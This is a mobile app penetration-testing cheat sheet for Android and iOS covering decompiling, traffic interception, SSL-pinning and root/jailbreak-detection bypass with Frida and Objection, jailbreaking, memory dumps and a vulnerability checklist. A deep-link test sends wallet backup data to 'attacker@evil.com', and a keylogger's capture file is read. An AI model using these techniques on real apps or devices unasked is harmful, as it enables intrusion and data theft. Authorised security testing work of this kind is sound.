----
## Android

#### Reverse Apk

```
d2j-dex2jar test.apk
-> use jd-gui to read the code
-> use IDA pro
-> unzip the .apk and check the folders and files
-> on Windows: use jdax-gui
-> (complete decompiling): ava -jar apktool_2.3.3.jar d <apk>
```

#### JADX

```
-> https://github.com/skylot/jadx (download the zip release)
-> On Windows: 
jadx.bat myApp.apk
jdax-gui.bat
```

#### Apktool

```
apktool d myapp.apk -o extractedFolder
```

#### Extract APK

```
- https://www.alphr.com/extract-apk-android/
- https://apps.evozi.com/apk-downloader/?id=
```

#### Dynamical Analyses with BurpSuite

```
-> Use Burp to intercept the requests on Android
 		https://support.portswigger.net/customer/portal/articles/1841101-configuring-an-android-device-to-work-with-burp

-> Android: https://support.portswigger.net/customer/portal/articles/1841102-Mobile%20Set-up_Android%20Device%20-%20Installing%20CA%20Certificate.html
```

#### Bypass SSL pinning

```
-> Android: https://blog.netspi.com/four-ways-bypass-android-ssl-verification-certificate-pinning/
			- Use objection method (technique 3)

Configuring Burp Suite With Android Nougat:
	-> https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/

- Make sure Kali is in Bridge mode
- if the Bridge cannot be set (NAT only), perform port forwarding via SSH (and config proxy localhost 8080 on phone):
	-> ssh -R 8080:localhost:8080 root@10.x.x.x -p 22

	-> Magisk ssh restart: /sbin/.magisk/modules/ssh/opensshd.init restart
```


#### Bypass Flutter/Non-HTTP apps

```
- https://github.com/Impact-I/reFlutter/
- https://github.com/summitt/Burp-Non-HTTP-Extension/wiki#basic-set-up-for-mobile-testing-testing-on-two-machines

Repackage and re-sign the apps:
- https://github.com/patrickfav/uber-apk-signer

Reverse with Hopper disassembler:
-> https://infosecwriteups.com/bypass-freerasps-mobile-security-measures-in-flutter-8a6d4f192e0d
```


#### Using ADB

```
-> adb devices (check the device)
-> adb install test.apk (install the .apk on the device)
-> adb shell	(execute cmd on the device) 
-> adb uninstall com.company.apppackage  (remove .apk)
-> adb install <path to apk> 	(install .apk on device)
-> adb push <myfile> <remote path> (push a file on the device)
-> adb pull <remote path> (get a file from the device)

-> adb reverse tcp:8082 tcp:8082 (forward traffic) + configure network proxy on the device to 127.0.0.1:8082

- List installed apps	=> adb shell cmd package list packages
- Simulate typing of text/characters => adb shell "input keyboard text 'ABC'"

- Get file from rooted phone:
	-> adb -d shell "su -c cat /sbin/.magisk/mirror/data/data/xx.com.xxxapp.xxx/app_webview/Default/databases/file__0/1" > data_android.db

- On laptop screen mirroring phone:
	-> scrcpy
```

#### Android Patching APK

```
-> https://github.com/badadaf/apkpatcher

-> Ensure that apktool is version 2.7.0

-> Manual repackaging:
	- https://fadeevab.com/frida-gadget-injection-on-android-no-root-2-methods/
```

#### Android processor architecture

```
-> ARM
-> Intel
-> MIPS
```

#### Android check the stack smashing protection

```
find . -name "*.so" -exec pwn checksec --file {} \;
```

#### Android Logs reading

```
-> use: adb logcat

adb logcat --pid=$(adb shell pidof -s com.xxxxx.yyyyy)
adb logcat --pid=12345
```

#### Android sensitive locations

```
- Shared Preferences
- SQLite Databases
- Firebase Databases
- Realm Databases
- Internal Storage
- External Storage
- Keystore

- Logging Functions
- Android Backups
- Processes Memory
- Keyboard Caches
- Screenshots

https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05d-testing-data-storage
```

#### Android debug test

```
- get the PID of the app:
	-> frida-ps -Uai

- Forward the app debug output to the debugger:
	-> adb forward tcp:1337 jdwp:<PID>

- Connect to the debugger:
	-> (echo suspend && cat) | jdb -attach localhost:1337
```

#### Android Drozer framework

```
sudo docker pull yogehi/drozer_docker
adb forward tcp:31415 tcp:31415
sudo docker run -it --net=host yogehi/drozer_docker
drozer console connect --server 127.0.0.1:31415

=> Drozer app must be in foreground on the phone

- Run the activity:
	run app.activity.start --component com.yogehi.blobfish com.yogehi.blobfish.example.activity.example1_getIntent
	
- Run the activity with extra data:
	run app.activity.start --component com.yogehi.blobfish com.yogehi.blobfish.example.activity.example1_getIntent --extra string "yay" "Hello World Yay"

- Print flag:
	run app.activity.start --component com.yogehi.blobfish com.yogehi.blobfish.MainActivity --extra integer DgkjG7XcbwJHgu3p 76597 --extra string VkUxvrEGtQ3x4BfV LWrz3xfqQ58sG3WN --extra boolean KrjvsVWd7rs9YYwW true --extra string android.intent.extra.REFERRER_NAME com.yogehi.blobfish
	
```

#### Android Intent and Activities

```
- List all the activities (with objection):
	-> android hooking list activities

- Launch an activity:
	-> android intent launch_activity com.abc.abc.Views.Activities.LoginActivity
```

#### Android Screenshots Location

```
/sdcard/DCIM/Screenshots
```


---
## iOS

#### Reverse .ipa file

```
-> https://reverseengineering.stackexchange.com/questions/1594/possibilities-for-reverse-engineering-an-ipa-file-to-its-source	

-> locate the bundle with objection:
	https://www.virtuesecurity.com/kb/ios-frida-objection-pentesting-cheat-sheet/

-> locate the bundle manually:
	-> find /private/var/containers/Bundle/Application/ -name "*.app" | grep -i "MyAppName"

-> extract bundle folder (/private/var/containers/Bundle/Application/XXXX-XXXX-XXX-XXXXX-XXXXXX)
	-> scp -r -P 2222 mobile@192.168.1.X:"/private/var/containers/Bundle/Application/XXXX-XXXX-XXX-XXXXX-XXXXXX/My App.app" .

-> copy the entire extracted folder (XXXX.app) in a "Payload" named folder and zip it YourChoiceName.ipa
	-> mkdir -p Payload
	-> cp -R MyApp.app Payload
	-> zip -r myapp.ipa Payload

-> Extract the app unencrypted
python3 frida-ios-dump.py -o decrypted_app.ipa com.company.myapp
```

#### Dynamical Analyses with BurpSuite

```
-> iOS: https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device

-> use Safari to download and install the cert from http://burp
```

#### Bypass SSL pinning

```
-> iOS: https://blog.netspi.com/four-ways-to-bypass-ios-ssl-verification-and-certificate-pinning/

-> objection --gadget "com.XXXXX" explore
-> ios sslpinning disable (install a self-signed cert before)

Using Burp's Invisible Proxy Settings to Test a Non-Proxy-Aware Thick Client Application:
	-> https://portswigger.net/support/using-burp-suites-invisible-proxy-settings-to-test-a-non-proxy-aware-thick-client-application

Disable and flush mDNSResponder on iOS:
-> launchctl unload -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist
(to relaunch it) -> launchctl load -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist
-> killall -HUP mDNSResponder; killall -HUP mDNSResponderHelper
```

#### iOS Patching IPA (repackaging)

```
-> on MacOS, create a 7-days signing certificate with Xcode (Accounts)

-> in Project options (Signing & Capabilities) choose the signing certificate

-> create and build a test project with Xcode (on the targeted device connected trust the profile) (lower the minimum iOS version supported: Project Options > General > Minimum Deployments > iOS)

-> check for the embedded.mobileprovision in /Users/myuser/Library/Developer/Xcode/DerivedData/myproject/Build/Products/Debug-abc/myproject.app

-> Verify the valid signing profiles:
	- security find-identity -p codesigning -v

-> Generate the patched IPA (with objection and frida gadgets installed):
	- objection patchipa --source myapp.ipa --codesign-signature ABC...

-> Install IPA on the phone: XCode > cmd+shift+2 > install on device
```

#### Search for files on the Phone/iPad

```
-> get the files concerning the application: 

	grep -rnwi / -e "NameOfApp" > myfile
```

#### iOS default ssh password

```
alpine
```

#### iOS DCIM directory

```
/private/var/mobile/Media/DCIM/
```

#### iOS Application path

```
/var/containers/Bundle/Application/
```

#### iOS Logs reading

```
-> use itools on Windows
-> use oslog (install it from cydia on the device: http://cydia.saurik.com/package/net.limneos.oslog/)

	on MacOS
		idevice_id --list
		idevicesyslog -u <device_ID> 
```

#### Jailbreak iOS 13

```
- install uncover ipa in iCloud
- delete old altstore, uncover from the phone
- on laptop install: altserver, iCloud (not from Microsoft Store), iTunes
- when launching altstore input the good location folder, open iCloud (and login), iTunes at the same time (create an Apple ID if needed)
- disable firewall, verify no proxy set on phone
- install uncover ipa on altstore app by clicking on +
- then launch uncover on phone

- Other way with 3utools:
- http://www.3u.com/news/articles/1505/how-to-install-ipa-file-in-iphone-using-3utools
	- Download and install on your laptop http://www.3u.com/
	- Launch 3uTools and connec the phone to laptop
	- Go to toolbox tab > jail break (at the bottom) > Choose Unc0ver > Then proceed
	- After that trust the Unc0ver on iPhone (go to Settings > General > Profile & Device Management > Find the developer app and trust it.)
	- Launch Unc0ver on iPhone, jailbreak it
	- Install .ipa apps in /var/mobile/Downloads

-> Link: https://ios.cfw.guide/installing-odysseyra1n/
```

#### Jailbreak iOS 14

```
- checkra1n: https://checkra.in/
```

#### Jailbreak iOS 15-16

```
- palera1n: https://pangu8.com/jailbreak/palera1n/
```

#### iOS App Transport Security (ATS)

```
-> check Info.plist for the key NSAppTransportSecurity  (If the NSAllowsArbitraryLoads key is set to YES/TRUE, it will disable all ATS restrictions for all network connections)
```

#### iOS get screenshots (specific number)

```
scp mobile@192.168.x.x:/User/Media/DCIM/100APPLE/*{35..39}.PNG .
```

#### iOS Screen Mirroring
```
https://hybridheroes.de/blog/record-ios-android-screen-macos/

1. **USB Connection**: Connect your iOS or iPadOS device to your macOS device using a lightning/ USB-C cable.
2. **Open QuickTime Player**: Launch QuickTime Player on your macOS.
3. **New Movie Recording**: From the "File" menu in QuickTime Player, select "New Movie Recording".
4. **Select Device**: Click on the dropdown arrow next to the record button and choose your connected iOS/iPadOS device under the "Camera" and "Microphone" sections.
5. **Mirror Screen**: Your iOS/iPadOS device's screen will now be mirrored on your macOS desktop via QuickTime Player.
6. **Record Screen**: To record the screen, simply click on the record button (red circle icon) in QuickTime Player.

```

---
### Frameworks

#### Frameworks installation

```
-> install frida-tools (https://www.frida.re/docs/installation/)

-> install frida server https://github.com/frida/frida/releases

-> iOS instrumentation: https://github.com/ChiChou/grapefruit
```

#### Objection and Frida installation

```
pip install frida-tools
pip install objection
```

#### Frida Framework

```
Android (rooted):
	-> adb shell getprop ro.product.cpu.abi 
	-> download the correct Frida server: https://github.com/frida/frida/releases 
	-> unxz file_name.xz
	-> adb push frida-server-12.2.29-android-arm64 /data/local/tmp/ 
	-> adb shell "chmod 755 /data/local/tmp/frida-server-12.2.29-android-arm64 " 
	-> adb shell 
	-> (on Device) su 
	-> (on Device) /data/local/tmp/frida-server-12.2.29-android-arm64 & 
	-> (on Kali) frida-ps -U
```

```
iOS (JailBroken):
	-> (on Device through ssh) uname -a
	-> download the correct frida server: https://github.com/frida/frida/releases 
	-> (on Kali) scp frida-server-12.2.29-android-arm64 <username>@<ip>:<path to destination> 
	-> (on Device ) chmod 755 frida-server-12.2.29-android-arm64 
	-> (on Device) ./frida-server-12.2.29-android-arm64 & 
	-> (on Kali) frida-ps -U
	-> (on Kali) frida-ps -Uai
	-> (on Kali) python3 fridump.py -s -U NameOfApp
```


#### MobSF Framework

```
-> git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF
-> ./setup.sh && ./run.sh
-> access page: http://localhost:8000
-> for dynamical analysis use genymotion

=> use the docker image in case of versions bugs
```

#### Listening remotely with frida-server (on phone, IP of the phone)

```
frida-server -l 0.0.0.0:19999 &
```

#### Using Frida tools to get the PID of the target app

```
-> frida-ps -ai -H 192.168.99.242:27043   (in case of remote frida server)
-> frida-ps -Uai      (in case of usb connected frida server)
```

#### Connect to remote frida server with custom port (pid of app is 1983 here)

```
-> objection -N --host 192.168.99.242 --port 27043 -g 1983 explore

-> frida-ps -ai -H 192.168.99.242:19999   (in case of remote frida server)
-> frida-ps -Uai      (in case of usb connected frida server)
```

#### Connect to remote frida server with custom port (pid of app is 1983 here)

```
-> objection -N --host 192.168.99.242 --port 19999 -g 1983 explore

/!\ in case of a timeout use the App Identifier (example: com.google.android.gm)

-> objection -N --host 192.168.99.242 --port 19999 -g com.google.android.gm explore
```

#### Connect to local frida (phone connected via usb)

```
objection -g 1983 explore
```

#### Import AES hook script with objection

```
import aes-hook.js
```

#### Objection dumping memory

```
memory dump all dump.txt
strings dump.txt > strings.txt 
```

#### Objection runtime injection test

```
ios ui alert "injection test"
```

#### Objection remove jailbreak detection on an app

```
objection -g “<package_name>” explore --startup-command 'ios jailbreak disable' 

objection -N --host 192.168.99.242 --port 19999 -g ID_of_app explore --startup-command 'ios jailbreak disable'
```

#### Objection Inspect cache and DB

```
- iOS:
	-> cmd: env
	-> get path to db
	-> sqlite connect path_to_db
	In the database:
		-> .tables
		-> select * from table_name
```

#### Objection Hooking methods

```
- Android:
		-> android hooking get current_activity
		-> android hooking watch class com.xxxx.android.activity.MainActivity

- iOS:
		-> ios hooking list classes --ignore-native
		-> ios hooking list class_methods <class_name>
		-> ios hooking generate simple <class_name>
```

#### Frida script example for injection

```
Java.perform(function() {
			var getAuthData_Activity = Java.use('o.getAuthData');
			getAuthData_Activity.IconCompatParcelizer.overload('android.content.Context', 'int', 'java.lang.String').implementation = function(message){
			return "Test injection";
			};
		});
```

#### Frida run script

```
frida -U myApp -l myscript.js --debug
```

#### Frida trace application

```
frida-trace -U --decorate -i "recv*" -i "send*" myApplication
```

#### Frida trace iOS

```
-> in the Hooking script:
	log(Memory.readCString(args[4]));
	
	log(ObjC.Object(args[7]));
	
	var obj = ObjC.Object(args[7]);
	log(obj.toString());
	
	log(ObjC.Object(args[2]).toString()); 
	
	args[6] = ObjC.classes.NSString.stringWithString_('jk-ishere.pdf');

-> cmd:
	frida-trace -U -f "com.Example.app" -m "*[GDHttpRequest open*]" -m "*[GDHttpRequest sendData*]"

-> objection:
	objection -g com.abc.abc explore -s "ios hooking watch method \"-[ThreatClass isJailbroken]\" --dump-args --dump-return --dump-backtrace"
```

#### Bypass root/jailbreak detection

```
-> Code share: 
https://codeshare.frida.re/browse
https://codeshare.frida.re/@dzonerzy/fridantiroot/

-> frida -H 192.168.1.26:19999 --codeshare dzonerzy/fridantiroot -f com.Example.app 
	
-> frida -H 192.168.1.26:19999 --codeshare ub3rsick/rootbeer-root-detection-bypass -f com.Example.app 

-> frida -U -l RootAndSSLBypass.js -f com.abc.abc --no-pause

-> objection -g <package_name> explore --startup-command 'android root disable'

-> Android tweaks: Magisk (Zigysk), RootCloak
	
-> For iOS: Frida, Liberty, FlyJB, Objection: https://www.appknox.com/blog/ios-jailbreak-detection-bypass
```

---
### Links

#### Dynamical Analysis

```
https://medium.com/@ansjdnakjdnajkd/dynamic-analysis-of-ios-apps-wo-jailbreak-1481ab3020d8
```

#### Mobile App Analysis Platform

```
https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security
```

#### Frida docs

```
https://learnfrida.info/java/
```

#### Check availability of an app region-locked

```
https://fnd.io/
```

#### Android Tapjacking PoC

```
https://github.com/geeksonsecurity/android-overlay-malware-example

https://apkpure.com/overlay-test/com.mebarin.overlaytest
```

#### Manual

```
https://github.com/OWASP/owasp-mstg

Objection commands documentation:
	https://github.com/sensepost/objection/tree/master/objection/console/helpfiles
```

#### Mitigations

```
- Sensitive data in memory: 

https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05d-Testing-Data-Storage.md#checking-memory-for-sensitive-data-mstg-storage-10
```

#### iOS debug

```
https://felipejfc.medium.com/the-ultimate-guide-for-live-debugging-apps-on-jailbroken-ios-12-4c5b48adf2fb
```

#### iOS testing

```
https://ios.pentestglobal.com/basics/installing-tools
```

#### Android Keylogger

```
- loki keyboard:

https://github.com/IceWreck/LokiBoard-Android-Keylogger

Internal Storage > Android > Data > com.abifog.lokiboard > files > lokiboard-files.txt

cat /sdcard/Android/data/com.abifog.lokiboard/files/loki... && echo "\n"

```

#### 🛠️ **Jailbreak Tweaks (from Cydia/Sileo)**

| Tweak                     | Purpose                                |
| ------------------------- | -------------------------------------- |
| **Filza File Manager**    | Full file system access, edit app data |
| **AppSync Unified**       | Sideload unsigned apps (test builds)   |
| **Cycript** (if old iOS)  | Runtime analysis (less used today)     |
| **Liberty Lite / HideJB** | Hide jailbreak from apps               |

#### Jailbreak Palera1n

##### 1st Step
- palera1n -f -c
	=> If any issues to reach DFU mode, change the cable
##### 2nd Step (to run also after a shutdown)
- palera1n -f

##### Next Steps

- install ssh server, then use ssh mobile@192.168.x.x
- scp frida_16.1.3_iphoneos-arm.deb mobile@192.168.x.x:/var/mobile/Downloads
- sudo dpkg -i frida_16.1.3_iphoneos-arm.deb
- root# frida-server    (run as root user after `sudo su`) 

#### Root Samsung Phone with Heimdall CLI

- 1st Part: OEM Unlocked (via Download mode) + USB debugging + Patch the firmware with Magisk on the phone + Get back the file on your laptop
- 2nd Part: Phone in Download mode + heimdall flash --BOOT boot.img --INIT_BOOT init_boot.img --no-reboot + boot in recovery mode to be sure (Volume Up + Power Key)


#### Vulnerabilities Checklist

```

[Android] Local Authentication Bypass
[Android] Unencrypted User Keys
[Android] Minimum SDK Version Not Enforced / Lower than Recommended

[Android] Permission Protection Level Downgrade
[Android] Tapjacking Vulnerability
[Android] Third Party Content Loaded Within WebView
[Android] No Emulator Detection
[Android] WebView JavaScript Enabled
[Android] Application Backups Allowed
[Android] Application Signed using v1 Signature Scheme
[Android] Application Debuggable Flag Set
[Android] WebView File Access Enabled
[Android] Ineffective/No Root Detection
[Android] Insufficient/No Code Obfuscation
[Android] Ineffective Tapjacking Mitigation
[Android] Cleartext Traffic Allowed
[Android] Unprotected Activity
[Android] Exported Content Providers 	- Check for unprotected content providers that expose sensitive data
[Android] Intent Sniffing/Hijacking 	- Verify protection against malicious apps intercepting intents
[Android] Deep Link Validation 		- Ensure proper validation of deep links to prevent injection attacks
[Android] Insecure Broadcast Receivers 	- Check for sensitive information leakage via broadcasts
[Android] WebView Remote Debugging Enabled 	- Can lead to data exposure
[Android] Unsafe Implementation of BiometricPrompt API 	- Improper implementation can lead to bypasses
[Android] Native Library Vulnerabilities 	- Check for memory corruption issues in native code
[Android] Accessibility Service Misuse 	- Protection against screen readers capturing sensitive information
[Android] Firebase Database Misconfiguration 	- Public/insecure database rules
[Android] Android Keystore Implementation Issues 	- Check for proper use of the Android Keystore

[Android]/[iOS]  Custom Keyboards Permitted
[Android]/[iOS] Sensitive Information Not Obscured when Taking Screenshots
[Android]/[iOS] No Logout on Device Lock
[Android]/[iOS] No SSL/TLS Certificate Pinning
[Android]/[iOS] Clipboard Enabled on Sensitive Fields
[Android]/[iOS] Apache Cordova Log Level Debug
[Android]/[iOS] Unencrypted Databases
[Android]/[iOS] Development Information Disclosure
[Android]/[iOS] Application Does Not Obscure Screenshot When Backgrounded
[Android]/[iOS] Debug Logs Enabled
[Android]/[iOS] Ineffective Anti-Hooking Detection
[Android]/[iOS] Sensitive Information Not Cleared on Logout
[Android]/[iOS] No Logout on Minimise
[Android]/[iOS] Sensitive Information Stored in Directory Folder
[Android]/[iOS] API Key Protection 		- Hardcoded API keys, tokens, or credentials
[Android]/[iOS] Session Handling Vulnerabilities 		- Improper session management
[Android]/[iOS] EXIF Data Exposure 			- Check if uploaded images retain sensitive metadata
[Android]/[iOS] Insecure WebSockets Implementation 		- Verify TLS usage and proper authentication
[Android]/[iOS] Insecure JWT Implementation 		- Check for proper validation of JWTs
[Android]/[iOS] Hardcoded Encryption Keys 		- Look for encryption keys in the code
[Android]/[iOS] Insecure Deeplink Handling 		- Validate handling of deeplinks to prevent injection attacks
[Android]/[iOS] Memory Dump Analysis 		- Check if sensitive data can be extracted from memory dumps
[Android]/[iOS] Poor Protection against Binary Analysis Tools 		- Resistance to static analysis tools
[Android]/[iOS] Unrestricted File Upload 		- Verify file upload validation
[Android]/[iOS] Man-in-the-Disk Attacks 		- Check for vulnerabilities in shared external storage
[Android]/[iOS] OAuth2 Flow Implementation Issues 		- Verify proper implementation of OAuth
[Android]/[iOS] Weak Input Validation 		- Check for SQLi, XSS in WebViews, etc.
[Android]/[iOS] Push Notification Security 		- Ensure push notifications don't contain sensitive data
[Android]/[iOS] Compliance Checks (GDPR, CCPA, etc.) 		- Verify data handling practices

[iOS] Application Accepts All Registered Biometric Identities
[iOS] Local Authentication Bypass
[iOS] Insecure Keychain Storage
[iOS] File Sharing
[iOS] No Anti-Debugging Protection
[iOS] Insufficient Code Obfuscation
[iOS] File Path Information Leakage
[iOS] iOS Request Caching
[iOS] Ineffective / No Jailbreak Detection
[iOS] App Transport Security (ATS)
[iOS] URL Scheme Hijacking - Check for proper URL scheme handling
[iOS] Improper Use of Pasteboard - Sensitive data might be accessible by other apps
[iOS] Insecure Swift/Objective-C Method Calls - Dynamic method invocation vulnerabilities
[iOS] UIWebView Usage (deprecated) - Should use WKWebView instead
[iOS] Broken App Sandbox - Check for sandbox escapes
[iOS] NSUserDefaults for Sensitive Data - Should use Keychain instead
[iOS] Insecure Touch ID/Face ID Implementation - Check LAContext usage

```



#### Web3 Wallets App

- How is the wallet private key stored on the device
- What algorithm to encrypt the wallet private key ? Any weak algorithms ?
- Is the private key sent to the server
- Can we bypass the user's PIN to send transactions ?
- How is the wallet private key generated ?
	- Generated **locally** on the device using a secure random number generator.
	- Often derived from a **BIP-39 mnemonic seed phrase** (e.g., 12 or 24 words).
	- The seed phrase is used with **BIP-32/BIP-44** to derive multiple private keys deterministically.
- Check Keychain and Keystore with correct encryption method such as AES + GCM, any hardcoded IV or key etc and then flag/attribute is also important such as kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly is consider stronger than kSecAttrAccessibleAlways, the key can be in insecure storage such as UserDefault, SharedPreferences.
- Android Keystore can only save cryptographic key, usually they use EncryptedSharedPreference + the key generated from Keystore

### What Wallets Should Not Do:

- They **do not send the private key to servers** (in non-custodial apps).
- They **do not store unencrypted private keys** on disk.
- They **do not use a single key for all accounts**, thanks to HD wallet standards (BIP-32/44).

### 🔍 How to Find Crypto Operations on Apps (Reverse Engineering)

### On **Android**:

- Use `jadx` or `frida` to look for:
    
    - `KeyGenParameterSpec`
        
    - `KeyStore.getInstance("AndroidKeyStore")`
        
    - `Cipher.getInstance("AES/GCM/NoPadding")`
        
    - Realm config with `encryptionKey`
        

### On **iOS**:

- Use `class-dump` or `frida` to find:
    
    - `SecItemAdd`, `SecItemCopyMatching`
        
    - Any method returning `NSData` of 64 bytes
        
    - `RLMRealmConfiguration` with `encryptionKey` property


#### Working Combo of Frida, Frida-tools, Objection 

**➜**  **tools** frida --version      

16.1.3

**➜**  **tools** objection version    

objection: 1.11.0

**➜**  **tools** pip show frida-tools

Name: frida-tools

Version: 12.1.0

=> Also use objection with the name of the app (instead of the ID if there is a timeout issue) (or the opposite, ID instead of name !)
```
objection -g blabla.myapp.ios explore
objection -g 1232 explore
```

=> objection and frida issue on Android, do the below commands on the Android device:

```
pm uninstall com.google.android.art
reboot
```


### Device Emulators

-> https://www.corellium.com/


#### Hermes Protected Code

-> https://github.com/P1sec/hermes-dec

#### Android Deep Links Testing

```

Run commands in this example format:

adb shell am start -a android.intent.action.VIEW -d "my.testapp.wallet://backup?auto_send=true&email=attacker@evil.com"

Monitor:

adb logcat | grep -i "wallet\|crash\|error"

adb logcat | grep -i "intent\|activity"

```

#### Android Show Min SDK Version
```
aapt dump badging my_test.apk | grep "sdkVersion"

```

#### iproxy & SSH port forwarding

```
SSH
	-> iproxy 2222 22
	-> ssh mobile@192.168.X.X -p 2222
	

BURPSUITE

	On Mac (for iOS)
	First Shell -> iproxy 2222 22
	Second Shell -> ssh -R 8080:localhost:9082 mobile@localhost -p 2222

	On Mac (for Android)
	First Shell -> adb reverse tcp:8080 tcp:9082
	
	-> Configure Proxy Listener on the Device:
		- Go to "Proxy" > "Options"
		- Ensure there's a listener on `127.0.0.1:8080`

	-> Configure BurpSuite Proxy:
		- Listen on 127.0.0.1:9082

```